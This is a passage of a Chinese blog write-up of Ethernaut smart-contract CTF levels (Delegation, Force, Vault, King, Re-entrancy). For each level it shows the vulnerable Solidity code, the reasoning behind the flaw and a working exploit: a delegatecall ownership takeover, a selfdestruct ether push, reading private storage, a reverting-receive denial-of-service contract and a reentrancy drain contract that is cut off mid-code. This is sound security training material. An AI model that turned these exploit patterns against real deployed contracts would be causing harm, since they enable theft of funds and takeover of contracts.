class="line-numbers-rows"><span></span></span></code></pre><p>如果有溢出, 代码会自动恢复.</p></blockquote>        <h2 id="Delegation"   >          <a href="#Delegation" class="heading-link"><i class="fas fa-link"></i></a><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2>      <blockquote><p>这一关的目标是申明你对你创建实例的所有权.</p><p> 这可能有帮助</p><ul><li>仔细看solidity文档关于 <code>delegatecall</code> 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.</li><li>Fallback 方法</li><li>方法 ID</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Delegate</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Delegation</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  Delegate delegate<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _delegateAddress<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    delegate <span class="token operator">=</span> <span class="token function">Delegate</span><span class="token punctuation">(</span>_delegateAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">fallback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>delegate<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显需要通过调用pwn函数来将owner变成我们自己，但是部署的合约是<code>Delegation</code>，我们该如何调用另一个合约中的函数呢，很简单，使用solidity中自带的call方法即可</p><p>在solidity中有三种call方法可用：</p><ul><li><p><strong>call</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用给定的payload发出一个低级(low-level)的<code>CALL</code>命令，返回执行是否成功和数据，转发所有可用gas，可调整。</p></li><li><p><strong>delegatecall</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.delegatecall(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用给定payload发出一个低级的<code>DELEGATECALL</code>指令，返回执行是否成功和数据，转发所有可用gas，可调整。</p></li><li><p><strong>staticcall</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;address&gt;.staticcall(bytes memory) returns (bool, bytes memory)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用给定payload发出一个低级的<code>STATICCALL</code>指令，返回执行是否成功和数据，转发所有可用gas，可调整。</p></li><li><p><del>这官方文档纯纯废话，说了跟没说一样</del></p></li></ul><p>乍一看似乎内容都差不多，那我们自己调用这些命令来测试一下吧</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.23</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Calltest</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        b<span class="token operator">=</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Compare</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> b<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> testaddress<span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">logb</span><span class="token punctuation">(</span><span class="token builtin">address</span> _a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _addressOfCalltest<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        testaddress <span class="token operator">=</span> _addressOfCalltest<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withcall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">//通过call方法调用函数</span>        testaddress<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"test()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">logb</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdelegatecall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token comment">//通过delegatecall方法调用函数</span>        testaddress<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"test()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">logb</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222013360.png"></p><p>图中可以看到，在使用call方法调用函数时，可以发现<code>CALLTEST</code>合约的b已经变成了这个合约的部署地址<code> 0xDA0bab807633f07f013f94DD0E6A4F96F8742B53</code>，而Compare合约的地址并没有变化。说明<code>call</code>只是在<code>Calltest</code>合约中执行了test函数</p><p>而在使用delegatecall方法调用函数时，<code>COMPARE</code>合约的b变成了合约部署地址，说明这个函数实际上是在<code>Compare</code>合约中执行的，也就相当于是把函数复制了一份到合约中执行</p><p>那么在这个合约中我们只需要通过fallback执行delegatecall来进入Delegate合约中的pwn方法来执行替换owner</p><p>而fallback函数的执行只需要sendTransaction方法，带上data即可执行pwn函数，方法的ID是4字节的sha3</p><pre class="line-numbers language-none"><code class="language-none">contract.sendTransaction(&#123;data:web3.utils.sha3(&quot;pwn()&quot;).slice(0,10)&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>使用<code>delegatecall</code> 是很危险的, 而且历史上已经多次被用于进行 attack vector. 使用它, 你对合约相当于在说 “看这里, -其他合约- 或是 -其它库-, 来对我的状态为所欲为吧”. 代理对你合约的状态有完全的控制权. <code>delegatecall</code> 函数是一个很有用的功能, 但是也很危险, 所以使用的时候需要非常小心.</p><p>请参见 <span class="exturl"><a class="exturl__link"   href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7" >The Parity Wallet Hack Explained</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 这篇文章, 他详细解释了这个方法是如何窃取三千万美元的.</p></blockquote>        <h2 id="Force"   >          <a href="#Force" class="heading-link"><i class="fas fa-link"></i></a><a href="#Force" class="headerlink" title="Force"></a>Force</h2>      <blockquote><p>有些合约就是拒绝你的付款,就是这么任性 <code>¯\_(ツ)_/¯</code></p><p>这一关的目标是使合约的余额大于0</p><p> 这可能有帮助:</p><ul><li>Fallback 方法</li><li>有时候攻击一个合约最好的方法是使用另一个合约.</li><li>阅读上方的帮助页面, “控制台之外” 部分</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Force</span> <span class="token punctuation">&#123;</span><span class="token comment">/*                   MEOW ?         /\_/\   /    ____/ o o \  /~____  =ø= / (______)__m_m)*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想让合约余额大于0首先想到的就是直接转账了<code>contract.sendTransaction(instance,1)</code>，但是由于fallback重写导致我们的交易被回退，如图所示</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208222059265.png"></p><p>此时我们就需要用到另一个合约了，在<code>selfdestruct</code>函数中会将整个合约销毁并将合约余额强制给予指定地址并且忽略fallback函数，所以这里我们只需要在制作一个新合约，存入代币，销毁发送到题目合约即可</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> aim<span class="token punctuation">;</span>  <span class="token keyword">constructor</span> <span class="token punctuation">(</span><span class="token builtin">address</span> t<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    aim<span class="token operator">=</span>t<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>      <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span>aim<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>在solidity中, 如果一个合约要接受 ether, fallback 方法必须设置为 <code>payable</code>.</p><p>但是, 并没有发什么办法可以阻止攻击者通过自毁的方法向合约发送 ether, 所以, 不要将任何合约逻辑基于 <code>address(this).balance == 0</code> 之上.</p></blockquote>        <h2 id="Vault"   >          <a href="#Vault" class="heading-link"><i class="fas fa-link"></i></a><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2>      <blockquote><p>打开 vault 来通过这一关!</p></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Vault</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> locked<span class="token punctuation">;</span>  <span class="token builtin">bytes32</span> <span class="token keyword">private</span> password<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    password <span class="token operator">=</span> _password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">==</span> _password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显要拿password，但是private怎么拿呢？</p><blockquote><p>这涉及到一点：以太坊部署和合约上所有的数据都是可读的，包括这里合约内定义为private类型的password变量，我们可以使用<code>web3.eth.getStorageAt</code>来读取合约行对应地址的数据</p><pre class="line-numbers language-none"><code class="language-none">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一个参数时对应要读取的合约地址，第二个参数是要读取内容的索引位置(变量是第几个被定义的变量)，第三个参数如果被设置，那么就不会使用默认的block(被<span class="exturl"><a class="exturl__link"   href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-defaultblock" >web3.eth.defaultBlock</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>设置的默认块)，而是使用用户自定义的块，这个参数可选项有<code>&quot;earliest&quot;</code>, <code>&quot;latest&quot;</code> 和 <code>&quot;pending&quot;</code>，第四个选项设置回调函数。</p></blockquote><p>所以我们直接读就好啦，password第二个被定义，我们直接读1</p><pre class="line-numbers language-none"><code class="language-none">await web3.eth.getStorageAt(contract.address,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后用password解锁就好啦～</p><blockquote><p>请记住, 将一个变量设制成私有, 只能保证不让别的合约访问他. 设制成私有的状态变量和本地变量, 依旧可以被公开访问.</p><p>为了确保数据私有, 需要在上链前加密. 在这种情况下, 密钥绝对不要公开, 否则会被任何想知道的人获得. <span class="exturl"><a class="exturl__link"   href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/" >zk-SNARKs</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 提供了一个可以判断某个人是否有某个秘密参数的方法,但是不必透露这个参数.</p></blockquote>        <h2 id="King"   >          <a href="#King" class="heading-link"><i class="fas fa-link"></i></a><a href="#King" class="headerlink" title="King"></a>King</h2>      <blockquote><p>下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.</p><p>这么有趣的游戏, 你的目标是攻破他.</p><p>当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.</p></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> king<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>      king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    king<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> king<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接看receive，我们需要出价比原来的king高才能拿到控制权，并且题目中说了在提交实例是关卡会重新尝试夺回王权，也就是再给我们一个更大数额的eth，我们怎么才能防止他通过更高出价来夺走王位呢？</p><p>我们只需要在另起一个合约，在合约中设置receive内容为revert函数，这样在我们的合约收到代币的时候就会触发回滚导致king重夺王位失败</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">AttackKing</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _victim<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        _victim<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">0.01</span> ether<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>大多数 Ethernaut 的关卡尝试展示真实发生的 bug 和 hack (以简化过的方式).</p><p>关于这次的情况, 参见: <span class="exturl"><a class="exturl__link"   href="https://www.kingoftheether.com/thrones/kingoftheether/index.html" >King of the Ether</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 和 <span class="exturl"><a class="exturl__link"   href="http://www.kingoftheether.com/postmortem.html" >King of the Ether Postmortem</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote>        <h1 id="Re-entrancy"   >          <a href="#Re-entrancy" class="heading-link"><i class="fas fa-link"></i></a><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1>      <p>经典的重入漏洞终于来喽</p><blockquote><p>这一关的目标是偷走合约的所有资产.</p><p> 这些可能有帮助:</p><ul><li>不可信的合约可以在你意料之外的地方执行代码.</li><li>Fallback methods</li><li>抛出/恢复 bubbling</li><li>有的时候攻击一个合约的最好方式是使用另一个合约.</li><li>查看上方帮助页面, “控制台之外” 部分</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span>_amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        _amount<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意这里使用了<code>call&#123;value:xx&#125;</code>的形式，<code>call</code>是<code>send</code>和<code>transfer</code>函数底层实现，也是用来转账的。与它们的区别在于，<span class="exturl"><a class="exturl__link"   href="https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/" >参考链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><ul><li>transfer:要求接收的智能合约中必须有一个<code>fallback</code>或者<code>receive</code>函数，否则会抛出一个错误(error)，并且revert（也就是回滚到交易前的状态）。而且有单笔交易中的操作总gas不能超过2300的限制。transfer函数会在以下两种情况抛出错误：<ul><li>付款方合约的余额不足，小于所要发送的value</li><li>接收方合约拒绝接收支付</li></ul></li><li>send:和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。</li><li>call: call函数和上面最大的区别在于，它没有gas的限制，使用call时EVM将所有gas转移到接收合约上，形式如下:</li></ul></blockquote><p>审计合约代码，这个合约的作用类似于银行，donate存withdraw取，那么这个代码问题究竟出在哪里呢，我们直接看存款函数，首先判断我们的账户是否有足够余额，然后给我们的账户转帐，最后扣除余额，看起来都没什么问题，但是如果银行的存款账户并不是一个钱包而是一个合约呢？</p><p>这时会直接进入到这个合约的fallback或者receive函数中，这时我们可以编写一个特殊的合约，让接收函数的fallback函数重复调用目标合约的<code>withdraw</code>函数，这样合约就会不断给我们所编写的合约转账直至余额为0。具体代码如下</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">attack</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">payable</span> target<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> amount <span class="token operator">=</span> <span class="token number">100000000000000</span> wei<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _addr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        target<span class="token operator">=</span>_addr<span class="token punctuation">;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"donate(address)"</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"step1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token 